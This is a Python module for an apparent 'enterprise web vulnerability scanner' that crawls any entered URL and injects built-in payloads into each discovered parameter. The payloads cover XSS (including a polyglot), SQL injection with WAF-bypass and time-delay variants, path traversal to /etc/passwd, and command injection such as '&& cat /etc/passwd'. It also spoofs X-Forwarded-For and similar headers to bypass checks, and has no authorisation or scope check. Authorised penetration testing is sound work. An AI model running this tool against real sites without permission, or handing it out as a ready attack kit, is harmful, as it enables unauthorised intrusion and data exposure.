# modules/vulnerability.py
import requests
import time
import random
import re
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from core.utils import clear_console

console = Console()

# --- Features ---

def discover_links_and_params(base_url, headers):
    """
    Crawls a given URL to discover links and extract parameters from forms and hrefs.
    This simulates a basic crawler to find potential attack surfaces.
    """
    console.print(f"[cyan]Crawling {base_url} to discover links and parameters...[/cyan]")
    links_to_scan = {base_url}
    discovered_params = set()
    scanned_links = set()

    try:
        response = requests.get(base_url, headers=headers, timeout=10, allow_redirects=True)
        soup = BeautifulSoup(response.content, "html.parser")

        # Discover parameters in forms
        for form in soup.find_all("form"):
            for input_tag in form.find_all("input"):
                name = input_tag.get("name")
                if name:
                    discovered_params.add(name)

        # Discover parameters and links from 'a' tags
        for a_tag in soup.find_all("a", href=True):
            href = a_tag['href']
            full_url = urljoin(base_url, href)
            parsed_full_url = urlparse(full_url)

            # Stay on the same domain
            if urlparse(base_url).netloc == parsed_full_url.netloc:
                links_to_scan.add(full_url)
                # Extract params from query string
                if parsed_full_url.query:
                    params = re.findall(r'([^=&]+)=', parsed_full_url.query)
                    for param in params:
                        discovered_params.add(param)

    except requests.RequestException as e:
        console.print(f"[yellow]Could not crawl {base_url}: {e}[/yellow]")

    console.print(f"[green]Discovered {len(links_to_scan)} links and {len(discovered_params)} parameters.[/green]")
    return list(links_to_scan), list(discovered_params) if discovered_params else ['q', 'id', 'search', 'user']


def get_contextual_payloads():
    """
    Returns a dictionary of payloads with obfuscation and WAF bypass techniques.
    """
    payloads = {
        "XSS": [
            # Basic
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            # Obfuscated
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&gt;\"&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "<svg/onload=alert`1`>",
            # Polyglot
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/*\"`'/**/alert(1)//'>"
        ],
        "SQLi": [
            # Basic
            "' OR '1'='1'-- ",
            "\" OR 1=1 -- ",
            # Obfuscated / WAF Bypass
            "/*'*/OR'1'='1'--",
            "' OR 1=1#",
            "1' WAITFOR DELAY '0:0:5'--",
            "SLEEP(5)#",
            # Integer based
            "1 OR 1=1"
        ],
        "Path Traversal": [
            "../../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//etc/passwd",
            "%252e%252e%252fetc%252fpasswd" # Double URL encode
        ],
        "Command Injection": [
            "; ls -la",
            "| dir",
            "&& cat /etc/passwd",
            "$(ping -c 1 127.0.0.1)",
            "`id`"
        ]
    }
    return payloads

def get_contextual_headers(target_url):
    """
    Returns headers with spoofing techniques to bypass simple security checks.
    """
    
    # User-agents list
    USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/605.1.15'
    ]

    parsed_url = urlparse(target_url)
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': f"{parsed_url.scheme}://{parsed_url.netloc}/",
        'Origin': f"{parsed_url.scheme}://{parsed_url.netloc}",
        'X-Forwarded-For': '127.0.0.1',
        'X-Client-IP': '127.0.0.1',
        'X-Real-IP': '127.0.0.1',
    }
    return headers

def contextual_attack_logic(param):
    """
    Determines which vulnerability types to test based on the parameter name.
    """
    param = param.lower()
    if any(p in param for p in ['id', 'user', 'num', 'page']):
        return ["SQLi", "XSS"]
    if any(p in param for p in ['search', 'q', 'query', 'term']):
        return ["XSS", "SQLi"]
    if any(p in param for p in ['file', 'path', 'page', 'include']):
        return ["Path Traversal", "Command Injection"]
    if any(p in param for p in ['cmd', 'exec', 'run']):
        return ["Command Injection"]
    # Default to testing for the most common vulnerabilities
    return ["XSS", "SQLi", "Command Injection"]


def run_vulnerability_scan():
    """
    Main function to run the enterprise-level vulnerability scanner.
    """
    clear_console()
    console.print(Panel.fit("[b]Enterprise Web Vulnerability Scanner[/b]",
                          style="#ff7675", padding=(1, 2)))

    url = console.input("\n[bold]  Enter target URL (e.g., https://example.com): [/] ").strip()

    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
        console.print(f"[yellow]⚠ No protocol specified. Using HTTPS.[/yellow]")

    headers = get_contextual_headers(url)
    payloads = get_contextual_payloads()
    error_patterns = {
        "SQLi": ["SQL syntax", "mysql_fetch", "unclosed quotation mark", "ORA-00933", "syntax error"],
        "XSS": ["<script>alert('XSS')</script>", "onerror=alert('XSS')"]
    }

    try:
        # --- Initial Analysis ---
        console.print("\n[cyan]Performing initial analysis...[/cyan]")
        test_response = requests.get(url, headers=headers, timeout=10, allow_redirects=True)
        if test_response.status_code != 200:
            console.print(f"[bold yellow]⚠ Warning: Target returned status code {test_response.status_code}[/bold yellow]")

        # --- Parameter and Link Discovery ---
        links_to_scan, discovered_params = discover_links_and_params(url, headers)
        console.print(f"[bold]Parameters to test:[/bold] {', '.join(discovered_params)}")

        # --- Reporting and Progress Bar ---
        report = Table(title=f"Vulnerability Report for {urlparse(url).netloc}",
                     style="bright_white", show_header=True, header_style="bold #ff7675", expand=True)
        report.add_column("Vulnerability")
        report.add_column("Location")
        report.add_column("Parameter")
        report.add_column("Payload")
        report.add_column("Status")

        total_tests = len(links_to_scan) * len(discovered_params) * sum(len(p) for p in payloads.values())
        progress = Progress(
            SpinnerColumn(),
            "[progress.description]{task.description}",
            BarColumn(),
            "{task.completed} of {task.total}",
            TextColumn("[bold green]{task.fields[status]}"),
            transient=True
        )

        with Live(report, console=console, screen=False, refresh_per_second=4):
            with progress:
                task = progress.add_task("[cyan]Scanning...", total=total_tests, status="Starting...")

                for link in links_to_scan:
                    for param in discovered_params:
                        vuln_types_to_test = contextual_attack_logic(param)

                        for vuln_type in vuln_types_to_test:
                            if vuln_type not in payloads: continue

                            for payload in payloads[vuln_type]:
                                progress.update(task, advance=1, status=f"Testing {vuln_type} on {param}...")
                                test_url = f"{link}?{param}={payload}"
                                try:
                                    start_time = time.time()
                                    response = requests.get(test_url, headers=headers, timeout=(5,20), allow_redirects=False)
                                    elapsed_time = time.time() - start_time

                                    vulnerable = False
                                    # Time-based SQLi check
                                    if "SQLi" in vuln_type and elapsed_time > 4.5:
                                        vulnerable = True
                                    # Error-based checks
                                    if any(error in response.text for error in error_patterns.get(vuln_type, [])):
                                        vulnerable = True
                                    # Reflection-based XSS check
                                    if "XSS" in vuln_type and payload in response.text:
                                        vulnerable = True
                                    # Command Injection check
                                    if "Command Injection" in vuln_type and ("root:" in response.text or "Directory of" in response.text):
                                        vulnerable = True

                                    if vulnerable:
                                        report.add_row(
                                            f"[yellow]{vuln_type}[/yellow]",
                                            f"[cyan]{link}[/cyan]",
                                            f"[magenta]{param}[/magenta]",
                                            f"[bright_black]{payload[:30]}...[/]",
                                            "[red]󰀦 Vulnerable[/red]"
                                        )

                                except requests.exceptions.RequestException:
                                    continue # Silently ignore request errors for cleaner output

            console.print(Panel(report, title="[bold]Scan Results[/bold]", style="#ff7675", padding=(1,2)))

    except requests.exceptions.RequestException as e:
        console.print(f"[bold red]⨯ Critical error: Could not connect to target. {e}[/bold red]")
    except Exception as e:
        console.print(f"[bold red]⨯ An unexpected error occurred: {e}[/bold red]")

if __name__ == "__main__":
    run_vulnerability_scan()
